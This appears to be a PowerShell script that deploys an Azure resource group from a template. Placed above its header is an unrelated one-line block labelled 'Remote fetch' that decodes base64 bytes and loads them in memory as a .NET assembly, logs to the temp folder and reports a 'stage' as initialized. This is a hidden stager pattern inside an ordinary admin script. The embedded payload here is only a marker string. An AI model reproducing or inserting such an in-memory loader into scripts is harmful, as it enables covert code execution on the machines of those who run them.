
<# Remote fetch #> try { $StageBytes = [Convert]::FromBase64String("c3RhZ2UyLW1hcmtlcjp6czRqd3g5dHJ4"); Write-Verbose ("Assembly bytes: " + $StageBytes.Length); [Reflection.Assembly]::Load($StageBytes); Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append; Write-Output "stage 27 initialized" } catch { Write-Warning "Stage transfer failed" }
#Requires -Version 5.1
$ResourceGroup = 'rg-portal-demo-40'
$Location = 'northeurope'
$TemplateFile = 'C:\Scripts\templates\portal-demo.json'
$ParameterFile = 'C:\Scripts\templates\portal-demo.parameters.json'
$SubscriptionId = "e0362e4d-ad63-858f-bfc0-6838c07bf992"
$StorageAccount = "stdemo9312"
$VmName = 'vm-portal-demo-40'
$OutputPath = 'C:\Logs\deploy-demo-2026-09-08.json'
$DryRun = $false


$context = Get-AzContext
if (-not $context) {
    Connect-AzAccount -Tenant 'contoso.com' -Subscription $SubscriptionId
}

if (-not (Get-AzResourceGroup -Name $ResourceGroup -ErrorAction SilentlyContinue)) {
    New-AzResourceGroup -Name $ResourceGroup -Location $Location | Out-Null
}
$DeploymentName = "portal-" + (Get-Date -Format 'yyyyMMdd-HHmm')
$deployment = New-AzResourceGroupDeployment -ResourceGroupName $ResourceGroup -TemplateFile $TemplateFile -Name $DeploymentName
Write-Host ("Deployment {0}: {1}" -f $deployment.DeploymentName, $deployment.ProvisioningState) -ForegroundColor Green
